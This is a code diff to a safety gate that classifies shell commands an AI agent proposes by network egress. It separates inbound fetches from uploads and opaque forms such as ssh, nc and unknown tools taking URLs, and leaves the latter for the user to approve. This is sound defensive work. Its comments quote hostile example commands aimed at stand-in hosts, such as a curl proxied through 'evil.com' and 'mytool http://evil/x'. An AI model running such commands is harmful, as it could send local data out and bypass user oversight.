@@ -84,8 +84,13 @@ import {
   NETWORK_COMMANDS,
   NETWORK_URL_RE,
   NETWORK_URL_RE_GLOBAL,
+  GIT_FETCH_SUBCOMMANDS,
+  UPLOAD_BODY_FLAGS,
+  UPLOAD_COPY_COMMANDS,
+  HTTP_METHOD_FLAGS,
   gitNetworkSubcommand,
   goCargoFetchForm,
+  isAllowedCommand,
   skipEnvPrefixes,
 } from "../config";
 
@@ -255,29 +260,133 @@ function operativeWords(words: string[]): string[] {
   return deleg ? deleg.tail.split(/\s+/) : oper;
 }
 
-/** First egress hit only (gate reason line); URLs truncated to 60 chars.
- *  Package-manager RUN forms are skipped (D8 — judgeable). The operative
- *  first word (env-prefixes skipped, wrapper/prefix delegation resolved) is
- *  checked, and git's subcommand is resolved past global flags via the shared
- *  gitNetworkSubcommand — `git -C dir push` is egress exactly like `git push`. */
-function networkHit(command: string, segments: string[]): string | null {
-  for (const seg of segments) {
-    const words = seg.trim().split(/\s+/);
-    const oper = operativeWords(words);
-    // cleanToken: `"ssh" host` is ssh to the shell — the first word is
-    // judged dequoted (git subcommand resolution is quote-aware in
-    // gitNetworkSubcommand; the URL catch-all below is quote-independent).
+/** What a network segment uses the wire for (D-a's egress split).
+ *  fetch  — inbound only: `git fetch/pull/ls-remote`, curl/wget with no
+ *           outbound body, form, upload, cookie or credential flag and no
+ *           mutating method. JUDGEABLE — nothing local leaves the machine, and
+ *           the file a download lands in is minted as a write operand
+ *           (analysis/write-roles.ts), so it faces the write bar (D-g/D-d).
+ *  upload — local data goes out: a curl body/form/upload-file/cookie/user, a
+ *           mutating method, scp/sftp/ftp/rsync, `git push`. ABSOLUTE — whether
+ *           what leaves is a secret is not verifiable from the command text, so
+ *           intent cannot stand in for the user's call (D-a, "exfil is not
+ *           intent-verifiable").
+ *  opaque — a network form the split cannot classify: ssh/nc, the container and
+ *           cloud CLIs, package fetches (install = fetch + postinstall code, so
+ *           it stays with D-a's untrusted-package stop), `git clone` (lays down
+ *           a tree the floor never named), and an unknown command taking a URL.
+ *           ABSOLUTE on the same grounds. */
+type EgressKind = "fetch" | "upload" | "opaque";
+
+/** Commands whose network surface the checks below enumerate completely (their
+ *  subcommand sets are closed: GIT_NETWORK_SUBCOMMANDS, goCargoFetchForm), so a
+ *  URL elsewhere in their argv is data — `git log --grep='http://x'`. */
+const ENUMERATED_NETWORK_COMMANDS = new Set(["git", "cargo", "go"]);
+
+/** True when a curl/wget segment sends data OUT (config:UPLOAD_BODY_FLAGS, plus
+ *  a mutating `-X`/`--request` method). Short flags may carry the value
+ *  attached (`-d'x=1'`, `-XPOST`); `--name=value` splits on the `=`. */
+function curlUploadForm(args: string[]): boolean {
+  for (let i = 0; i < args.length; i++) {
+    const t = cleanToken(args[i]);
+    if (!t.startsWith("-")) continue;
+    const eq = t.indexOf("=");
+    const name = eq > 0 ? t.slice(0, eq) : t;
+    // A short value flag may carry its value attached: `-d`/`-d'x'`/`-Td`.
+    const short = name.length > 2 && !name.startsWith("--") ? name.slice(0, 2) : name;
+    if (UPLOAD_BODY_FLAGS.has(name) || UPLOAD_BODY_FLAGS.has(short)) return true;
+    if (HTTP_METHOD_FLAGS.has(name) || HTTP_METHOD_FLAGS.has(short)) {
+      // The value is `--request=POST`, `-X POST` or `-XPOST`.
+      const attached = eq > 0 ? t.slice(eq + 1) : t.slice(short.length);
+      const method = cleanToken(attached || args[i + 1] || "").toUpperCase();
+      if (method && method !== "GET" && method !== "HEAD") return true;
+    }
+  }
+  return false;
+}
+
+/** The egress class of one segment, or null when the segment does not talk to a
+ *  remote. Words come from the quote-aware tokenizer: a whitespace split made
+ *  `-H 'content-type: application/json'` name the bare target `application/json`
+ *  (3 of the 10 egress stops in the 2026-10-18 ledger replay). */
+function segmentEgress(seg: string): { token: string; kind: EgressKind } | null {
+  const oper = operativeWords(tokenizeSegment(seg));
+  // cleanToken: `"ssh" host` is ssh to the shell (git subcommand resolution is
+  // quote-aware in gitNetworkSubcommand).
+  const first = cleanToken(oper[0] ?? "").toLowerCase();
+  if (!first) return null;
+  if (isPkgRunForm(first, oper)) return null; // D8 run forms — judged on their own rules
+  const sub = gitNetworkSubcommand(oper);
+  if (sub) {
+    const kind: EgressKind = GIT_FETCH_SUBCOMMANDS.has(sub) ? "fetch" : sub === "push" ? "upload" : "opaque";
+    return { token: `git ${sub}`, kind };
+  }
+  const gc = goCargoFetchForm(oper);
+  if (gc) return { token: gc, kind: "opaque" };
+  if (!NETWORK_COMMANDS.has(first)) return null;
+  if (first === "curl" || first === "wget") {
+    return { token: first, kind: curlUploadForm(oper.slice(1)) ? "upload" : "fetch" };
+  }
+  if (UPLOAD_COPY_COMMANDS.has(first)) return { token: first, kind: "upload" };
+  return { token: first, kind: "opaque" };
+}
+
+/** A segment whose command the egress machinery cannot enumerate: not one of the
+ *  read-only ALLOW_TABLE commands, not a network command, not a command whose
+ *  remote surface is a closed subcommand set. Unknown is never benign — the URL
+ *  in its argv is a destination (`mytool http://evil/x`, `bash -c 'curl …'`). */
+function segmentHasUnknownCommand(seg: string): boolean {
+  for (const stage of splitOnPipe(seg)) {
+    const oper = operativeWords(tokenizeSegment(stage));
     const first = cleanToken(oper[0] ?? "").toLowerCase();
     if (!first) continue;
-    if (isPkgRunForm(first, oper)) continue;
-    if (NETWORK_COMMANDS.has(first)) return first;
-    const sub = gitNetworkSubcommand(oper);
-    if (sub) return `git ${sub}`;
-    const gc = goCargoFetchForm(oper);
-    if (gc) return gc;
+    if (isAllowedCommand(first) || NETWORK_COMMANDS.has(first)) continue;
+    if (ENUMERATED_NETWORK_COMMANDS.has(first)) continue;
+    return true;
   }
-  const m = command.match(NETWORK_URL_RE);
-  return m ? m[0].slice(0, 60) : null;
+  return false;
+}
+
+/** First egress hit that the floor must stop on, or (when every hit is
+ *  inbound) the fetch hit itself; URLs truncated to 60 chars. Package-manager
+ *  RUN forms are skipped (D8 — judgeable). The operative first word
+ *  (env-prefixes skipped, wrapper/prefix delegation resolved) is checked, and
+ *  git's subcommand is resolved past global flags via the shared
+ *  gitNetworkSubcommand — `git -C dir push` is egress exactly like `git push`. */
+function networkHit(command: string, segments: string[]): { token: string; kind: EgressKind } | null {
+  let inbound: { token: string; kind: EgressKind } | null = null;
+  for (const seg of segments) {
+    const hit = segmentEgress(seg);
+    if (!hit) continue;
+    if (hit.kind !== "fetch") return hit; // the stop-worthy half names the reason
+    inbound ??= hit;
+  }
+  // D-i: the fetch half's premise is "nothing local leaves the machine", which
+  // needs a destination the parse can READ. `curl -x evil.com:8080
+  // http://127.0.0.1/y` sends the request through a route the text does not
+  // name; `socks5://`/`ftp://` forms and a target stated only as a variable
+  // (`curl "$B/notes"`) or not at all (`curl -O pkg.tgz`) are the same hole.
+  // destinationHosts already returns null/empty for all of those, so an
+  // unclassifiable curl/wget destination falls to the opaque half.
+  if (inbound && (inbound.token === "curl" || inbound.token === "wget")) {
+    const hosts = destinationHosts(command, segments);
+    if (!hosts || hosts.length === 0) return { token: inbound.token, kind: "opaque" };
+  }
+  // The URL catch-all covers commands OUTSIDE that vocabulary — and only those.
+  // Inside it a URL literal is data, which is what the whole-command scan used to
+  // cost: `grep -rn 'http://example.com' docs/`, `sed -i 's|http://a|http://b|'`,
+  // a heredoc writing docs that quote a curl example (the 2026-10-18 replay
+  // counted 4 such stops in 520 rows). A fetch segment plus a URL in a doc body
+  // stays fetch — the classification above already saw the segment.
+  if (segments.some(segmentHasUnknownCommand)) {
+    const urls = command.match(NETWORK_URL_RE_GLOBAL) ?? [];
+    if (urls.length > 0) {
+      // Name a URL the floor actually stops on, not the first one in the text.
+      const offending = urls.find((u) => !isLoopbackHost(urlHost(u))) ?? urls[0];
+      return { token: offending.slice(0, 60), kind: "opaque" };
+    }
+  }
+  return inbound;
 }
 
 /** Egress commands whose destination is a URL visible in the command text. */
@@ -331,8 +440,7 @@ function isLoopbackHost(hostWithPort: string): boolean {
  */
 function isLoopbackEgress(command: string, segments: string[]): boolean {
   for (const seg of segments) {
-    const words = seg.trim().split(/\s+/);
-    const oper = operativeWords(words);
+    const oper = operativeWords(tokenizeSegment(seg));
     // cleanToken: a quoted curl is still curl (`"curl" http://127…` must
     // not fall out of the egress classification entirely).
     const first = cleanToken(oper[0] ?? "").toLowerCase();
@@ -382,9 +490,18 @@ const OPAQUE_SCHEME_RE = /:\/\/|^\/{2}/;
  * parse cannot resolve, which is not the same as stating no destination.
  */
 function destinationHosts(command: string, segments: string[]): string[] | null {
-  const hosts = (command.match(NETWORK_URL_RE_GLOBAL) ?? []).map(urlHost);
+  const hosts: string[] = [];
+  for (const u of command.match(NETWORK_URL_RE_GLOBAL) ?? []) {
+    const h = urlHost(u);
+    // `http://$HOST/x` is a stated destination this parse cannot resolve —
+    // as unresolvable as the proxy forms below, not a host that merely fails
+    // the loopback test. (A `$` in the PORT survives: `http://127.0.0.1:$p/…`
+    // is as local as the literal form, since locality is a host question.)
+    if (/[$`]/.test(h.split("@").pop()!.split(":")[0])) return null;
+    hosts.push(h);
+  }
   for (const seg of segments) {
-    const oper = operativeWords(seg.trim().split(/\s+/));
+    const oper = operativeWords(tokenizeSegment(seg));
     const first = cleanToken(oper[0] ?? "").toLowerCase();
     if (!first || !LOOPBACK_EGRESS_CMDS.has(first)) continue;
     for (const w of oper.slice(1)) {
@@ -702,14 +819,18 @@ export async function checkDspaGate(
     const scan = rootScanTarget(seg);
     if (scan) return { ok: false, reason: `full filesystem scan (${scan} /)`, advisory: true };
   }
-  // D14 (docs/dspa-redesign.md): network egress. Loopback-only curl/wget is
-  // judgeable (a local call can't exfiltrate; the judge reviews the full
-  // text). All other egress stays a floor stop — but advisory: the judge
-  // runs both stages and its verdict renders in the prompt as input to the
-  // user's allow/deny (the stop stands; egress is never auto-allowed).
+  // D14 (docs/dspa-redesign.md) + D-a (docs/dspa-intent-floor.md): network
+  // egress. Only the outbound half of the split is a floor stop — an inbound
+  // fetch (`git fetch`, a curl/wget GET) is judgeable: nothing local leaves the
+  // machine and the downloaded file is minted as a write operand, so it faces
+  // the write bar. Loopback-only curl/wget stays judgeable whatever it sends (a
+  // local call cannot exfiltrate). Uploads, copies to a remote and the opaque
+  // forms stop — but advisory: the judge runs both stages and its verdict
+  // renders in the prompt as input to the user's allow/deny (the stop stands;
+  // egress is never auto-allowed).
   const net = networkHit(pd.command, analysis.segments);
-  if (net && !isLoopbackEgress(pd.command, analysis.segments)) {
-    return { ok: false, reason: `network egress (${net})`, advisory: true };
+  if (net && net.kind !== "fetch" && !isLoopbackEgress(pd.command, analysis.segments)) {
+    return { ok: false, reason: `network egress (${net.token})`, advisory: true };
   }
   // prompt.outsidePaths already applied the manual bar (above): what's left
   // is exactly what manual mode would prompt for — the scope class (Q1:
